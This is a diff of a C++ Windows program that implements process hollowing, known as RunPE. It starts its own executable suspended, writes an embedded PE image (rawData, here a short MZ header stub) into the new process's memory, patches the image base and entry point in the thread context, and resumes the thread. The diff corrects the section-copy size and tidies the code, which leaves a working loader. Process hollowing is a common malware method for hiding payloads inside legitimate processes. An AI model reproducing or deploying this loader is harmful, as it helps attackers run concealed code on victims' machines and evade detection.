@@ -1,55 +1,58 @@
-#include <iostream>
-#include <string>
-
-#include <windows.h>
+#include <iostream> 
+#include <string> 
+#include <Windows.h> 
 #include <TlHelp32.h>
+#include <fstream>
 
-auto RunPortableExecutable(HANDLE image) -> int
+
+int RunPortableExecutable(void* Image)
 {
-	
-	PROCESS_INFORMATION PI;
-	STARTUPINFOA SI;
-	
-	DWORD* ImageBase;
-	void* pImageBase;
+	IMAGE_DOS_HEADER* DOSHeader = PIMAGE_DOS_HEADER(Image);
+	IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
 
-	int count;
-	char CurrentFilePath[1024];
-
-	IMAGE_DOS_HEADER* pImgDos = PIMAGE_DOS_HEADER(image);
-	IMAGE_NT_HEADERS* pImgNt = PIMAGE_NT_HEADERS(DWORD(image) + pImgDos->e_lfanew);
-
+	char CurrentFilePath[1024] = { 0 };
 	GetModuleFileNameA(0, CurrentFilePath, 1024);
 
-	if (pImgNt->Signature == IMAGE_NT_SIGNATURE)
+	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
 	{
+		PROCESS_INFORMATION PI;
+		STARTUPINFOA SI;
+
 		ZeroMemory(&PI, sizeof(PI));
 		ZeroMemory(&SI, sizeof(SI));
 
-		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
+			CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+
 		{
-			
-			CONTEXT* CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+
+			CONTEXT* CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
 			CTX->ContextFlags = CONTEXT_FULL;
 
 			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
 			{
+				DWORD* ImageBase = 0;
+
 				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
 
-				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(pImgNt->OptionalHeader.ImageBase), pImgNt->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+				void* pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
+					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
 
-				WriteProcessMemory(PI.hProcess, pImageBase, image, pImgNt->OptionalHeader.SizeOfHeaders, NULL);
 
-				for (count = 0; count < pImgNt->FileHeader.NumberOfSections; count++)
+				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+
+				for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
 				{
-					IMAGE_SECTION_HEADER* imgSectHeader = PIMAGE_SECTION_HEADER(DWORD(image) + pImgDos->e_lfanew + 248 + (count * 40));
+					IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (i * 40));
 
-					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + imgSectHeader->VirtualAddress), LPVOID(DWORD(image) + imgSectHeader->PointerToRawData), imgSectHeader->PointerToRawData, 0);
+					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
+						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
 				}
-				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImgNt->OptionalHeader.ImageBase), 4, 0);
+				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
+					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
 
-				CTX->Eax = DWORD(pImageBase) + pImgNt->OptionalHeader.AddressOfEntryPoint;
-				
+
+				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
 				ResumeThread(PI.hThread);
 
@@ -58,12 +61,18 @@ auto RunPortableExecutable(HANDLE image) -> int
 		}
 	}
 }
-
-
-unsigned char rawData[] = {raw data binary};
-
+unsigned char rawData[] = 
+{	
+	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
+};
 
 auto main(void) -> int
 {
 	RunPortableExecutable(rawData);
+	
+	getchar();
+
+	return 0;
 }
